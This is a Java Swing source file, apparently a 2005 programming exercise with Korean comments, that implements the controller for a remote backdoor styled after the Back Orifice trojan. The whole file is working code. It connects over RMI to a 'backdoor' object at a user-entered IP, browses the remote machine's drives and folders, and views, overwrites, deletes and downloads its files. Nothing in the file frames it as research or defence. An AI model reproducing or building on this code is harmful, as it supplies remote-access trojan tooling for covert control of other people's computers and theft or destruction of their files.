
package back.util;

import java.awt.*;
import java.awt.event.*;
import java.io.*;
import java.util.*;
import javax.swing.*;
import javax.swing.border.*;
import javax.swing.event.*;
import javax.swing.tree.*;


/*
 * Created on 2005. 11. 25.
 *
 * To change the template for this generated file go to
 * Window&gt;Preferences&gt;Java&gt;Code Generation&gt;Code and Comments
 */

/**
 * @author kimsh
 *
 * To change the template for this generated type comment go to
 * Window&gt;Preferences&gt;Java&gt;Code Generation&gt;Code and Comments
 */
public class BackOrificeGUI
	extends JFrame
	implements WindowListener, ActionListener, TreeWillExpandListener {

	//field 자리
	private Container con;
	private JSplitPane sp = new JSplitPane();
	private JSplitPane sp1 = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
	private DefaultMutableTreeNode root = new DefaultMutableTreeNode("My 탐색기");
	private JTree tree_jt = new JTree(root);
	private JScrollPane tree_jsp = new JScrollPane(tree_jt);
	private Vector view_vc = new Vector();
	private JList view_li = new JList(view_vc);
	private JScrollPane view_jsp = new JScrollPane(view_li);
	private JButton view_bt = new JButton("VIEW");
	private JButton edit_bt = new JButton("EDIT");
	private JButton del_bt = new JButton("DELETE");
	private JButton end_bt = new JButton("DOWNLOAD");
	private JTextArea data_ta = new JTextArea();
	private JScrollPane data_jsp = new JScrollPane(data_ta);
	private Dimension screen;

	private JTextField ip_tf = new JTextField();
	private JButton connect_bt = new JButton("Connect");

	private BackOrifice back;
	//field 자리 

	public BackOrificeGUI() {
		super("My 탐색기");
		screen = Toolkit.getDefaultToolkit().getScreenSize();
		this.init();
		this.start();
		this.setSize((int) screen.getWidth(), (int) screen.getHeight());
		this.setLocation(0, 0);
		this.setVisible(true);
	}
	public void init() {
		con = this.getContentPane();
		con.setLayout(new BorderLayout());
		JPanel jpjp = new JPanel(new BorderLayout());
		jpjp.add("Center", ip_tf);
		jpjp.add("East", connect_bt);
		ip_tf.setBorder(new TitledBorder("Connection IP!"));
		con.add("North", jpjp);
		con.add("Center", sp);
		tree_jsp.setPreferredSize(new Dimension(200, (int) screen.getHeight()));
		sp.setLeftComponent(tree_jsp);
		JPanel jp = new JPanel(new BorderLayout());
		view_jsp.setPreferredSize(
			new Dimension((int) screen.getWidth() - 220, 300));
		jp.add("Center", view_jsp);
		JPanel jp1 = new JPanel(new GridLayout(1, 4, 5, 5));
		jp1.add(view_bt);
		jp1.add(edit_bt);
		jp1.add(del_bt);
		jp1.add(end_bt);
		jp.add("South", jp1);
		sp1.setTopComponent(jp);
		sp1.setBottomComponent(data_jsp);
		sp.setRightComponent(sp1);
	}
	public void start() {
		this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		ip_tf.addActionListener(this);
		connect_bt.addActionListener(this);
		tree_jt.addTreeWillExpandListener(this);
		
		view_bt.addActionListener(this);//VIEW
		edit_bt.addActionListener(this);//EDIT
		del_bt.addActionListener(this);//DELETE
		end_bt.addActionListener(this);//DOWNLOAD
		view_bt.setActionCommand("op");
		edit_bt.setActionCommand("op");
		del_bt.setActionCommand("op");
		end_bt.setActionCommand("op");
	}

	/* (non-Javadoc)
	 * @see java.awt.event.WindowListener#windowActivated(java.awt.event.WindowEvent)
	 */
	public void windowActivated(WindowEvent arg0) {
		// TODO Auto-generated method stub

	}

	/* (non-Javadoc)
	 * @see java.awt.event.WindowListener#windowClosed(java.awt.event.WindowEvent)
	 */
	public void windowClosed(WindowEvent arg0) {
		// TODO Auto-generated method stub

	}

	/* (non-Javadoc)
	 * @see java.awt.event.WindowListener#windowClosing(java.awt.event.WindowEvent)
	 */
	public void windowClosing(WindowEvent arg0) {
		// TODO Auto-generated method stub

	}

	/* (non-Javadoc)
	 * @see java.awt.event.WindowListener#windowDeactivated(java.awt.event.WindowEvent)
	 */
	public void windowDeactivated(WindowEvent arg0) {
		// TODO Auto-generated method stub

	}

	/* (non-Javadoc)
	 * @see java.awt.event.WindowListener#windowDeiconified(java.awt.event.WindowEvent)
	 */
	public void windowDeiconified(WindowEvent arg0) {
		// TODO Auto-generated method stub

	}

	/* (non-Javadoc)
	 * @see java.awt.event.WindowListener#windowIconified(java.awt.event.WindowEvent)
	 */
	public void windowIconified(WindowEvent arg0) {
		// TODO Auto-generated method stub

	}

	/* (non-Javadoc)
	 * @see java.awt.event.WindowListener#windowOpened(java.awt.event.WindowEvent)
	 */
	public void windowOpened(WindowEvent arg0) {
		// TODO Auto-generated method stub

	}

	/* (non-Javadoc)
	 * @see java.awt.event.ActionListener#actionPerformed(java.awt.event.ActionEvent)
	 */
	public void actionPerformed(ActionEvent e) {
		// TODO Auto-generated method stub
		if(e.getActionCommand().equals("op")) {
			String path = "";
			String filename = "";
			TreePath tp = tree_jt.getSelectionPath();
			//[My 탐색기, c:\, work]
			StringTokenizer st = 
			  new StringTokenizer(tp.toString(), "[,]");
			st.nextToken();
			if(!st.hasMoreTokens()) return;
			StringBuffer sb = new StringBuffer();
			while(st.hasMoreTokens()) {
				sb.append(st.nextToken().trim()
									+ File.separator);
			}
			path = sb.toString();
			filename = 
				(String)view_li.getSelectedValue();
			if(filename == null) return;
			
			if(e.getSource() == view_bt) {
				try {
					String str = 
						back.getContents(path, filename);
					data_ta.setText(str);
				}catch(java.rmi.RemoteException ee) {}
			}
			else if(e.getSource() == edit_bt) {
				String str = data_ta.getText().trim();
				try {
					back.setContents(path, filename, str);
				}catch(java.rmi.RemoteException ee) {}
			}
			else if(e.getSource() == del_bt) {
				try {
					back.delFile(path, filename);
				}catch(java.rmi.RemoteException ee) {}
			}
			else if(e.getSource() == end_bt) {
				try {
					StringBuffer f = back.getData(path, filename);
					File ff = new File(filename);
					PrintWriter out = new PrintWriter(
						new BufferedWriter(
						new FileWriter(ff)));
					out.println(f.toString());
					out.close();
					JOptionPane.showMessageDialog(this,
						"다운로드 완료!", "완료!",
						JOptionPane.INFORMATION_MESSAGE);
				}catch(Exception ee) {}
			}//다운로드
		}
		else if (e.getSource() == ip_tf || e.getSource() == connect_bt) {
			String ip = ip_tf.getText();
			if (ip == null)
				return;
			try {
				back =
					(BackOrifice) java.rmi.Naming.lookup(
						"rmi://" + ip.trim() + "/backdoor");
				ip_tf.setEnabled(false);
				connect_bt.setEnabled(false);
				Vector vc = back.getRoots();
				for (int i = 0; i < vc.size(); i++) {
					String str = (String) vc.elementAt(i);
					DefaultMutableTreeNode imsi =
						new DefaultMutableTreeNode(str);
					DefaultMutableTreeNode imsi1 =
						new DefaultMutableTreeNode("EMPTY");
					imsi.add(imsi1);
					root.add(imsi);
				}
				tree_jt.updateUI();
			} catch (java.rmi.RemoteException ee) {
			} catch (java.net.MalformedURLException ee) {
			} catch (java.rmi.NotBoundException ee) {
			}
		}		
	}

	/* (non-Javadoc)
	 * @see javax.swing.event.TreeWillExpandListener#treeWillCollapse(javax.swing.event.TreeExpansionEvent)
	 */
	public void treeWillCollapse(TreeExpansionEvent arg0)
		throws ExpandVetoException {
		// TODO Auto-generated method stub

	}

	/* (non-Javadoc)
	 * @see javax.swing.event.TreeWillExpandListener#treeWillExpand(javax.swing.event.TreeExpansionEvent)
	 */
	public void treeWillExpand(TreeExpansionEvent e)
		throws ExpandVetoException {
		// TODO Auto-generated method stub
		if (e.getSource() == tree_jt) {
			tree_jt.setSelectionPath(e.getPath());
			TreePath tp = tree_jt.getSelectionPath();
			//[My 탐색기, C:\, EMPTY]
			//System.out.println(tp);
			StringTokenizer st = 
				new StringTokenizer(tp.toString(), "[,]");
			st.nextToken();//My 탐색기.. 필요 없.
			StringBuffer sb = new StringBuffer();
			if (!st.hasMoreElements())
				return;
			while (st.hasMoreTokens()) {
				sb.append(st.nextToken().trim() + File.separator);
			}
			try {
				//그 path에 있는 폴더 줘.....
				Vector vc = back.getFolders(sb.toString());
				//그 path에 있는 파일 줘...
				Vector vc1 = back.getFiles(sb.toString());
				DefaultMutableTreeNode node =
					(DefaultMutableTreeNode)
					 tp.getLastPathComponent();
				node.removeAllChildren();
				if(vc.size() == 0) {
					node.add(new DefaultMutableTreeNode("EMPTY"));
					tree_jt.fireTreeCollapsed(tp);					
					tree_jt.updateUI();
				}
				else {
					for (int a = 0; a < vc.size(); a++) {
						String ss = (String) vc.elementAt(a);
						DefaultMutableTreeNode nn = new DefaultMutableTreeNode(ss);
						DefaultMutableTreeNode nn1 =
							new DefaultMutableTreeNode("EMPTY");
						nn.add(nn1);
						node.add(nn);
					}
				}
				//tree_jt.updateUI();
				
				view_vc.clear();
				for (int a = 0; a < vc1.size(); a++) {
					view_vc.add((String) vc1.elementAt(a));
				}
				view_li.setListData(view_vc);
			} catch (java.rmi.RemoteException ee) {
			}			
		}
	}

	public static void main(String[] args) {
		try {
			UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
		} catch (Exception ee) {System.err.println("error="+ee);
		}
		BackOrificeGUI gui = new BackOrificeGUI();
	}
}
